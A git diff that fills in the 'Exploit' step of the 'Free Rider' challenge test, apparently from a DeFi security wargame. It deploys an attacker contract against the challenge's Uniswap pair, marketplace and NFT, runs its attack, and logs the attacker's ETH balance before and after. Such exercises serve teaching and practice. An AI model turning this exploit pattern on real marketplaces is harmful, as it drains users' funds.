@@ -104,7 +104,19 @@ describe('[Challenge] Free Rider', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        const AttackerFactory = await ethers.getContractFactory('FreeRiderAttacker', attacker);
+        const attackerContract = await AttackerFactory.deploy(this.uniswapPair.address, this.weth.address, this.marketplace.address, this.buyerContract.address, this.nft.address);
+        console.log("## OUR ATTACKER CONTRACT HAS BEEN DEPLOYED TO: ", attackerContract.address);
+
+        let initialAttackerBalance =  await ethers.provider.getBalance(attacker.address);
+        console.log(`## INITIAL ATTACKER BALANCE ${ethers.utils.formatEther(initialAttackerBalance)} ETH`)
+
+        //Attack
+        console.log("## INITIATING ATTACK");
+        await attackerContract.attack();
+
+        let finalAttackerBalance =  await ethers.provider.getBalance(attacker.address);
+        console.log(`## FINAL ATTACKER BALANCE ${ethers.utils.formatEther(finalAttackerBalance)} ETH`)
     });
 
     after(async function () {
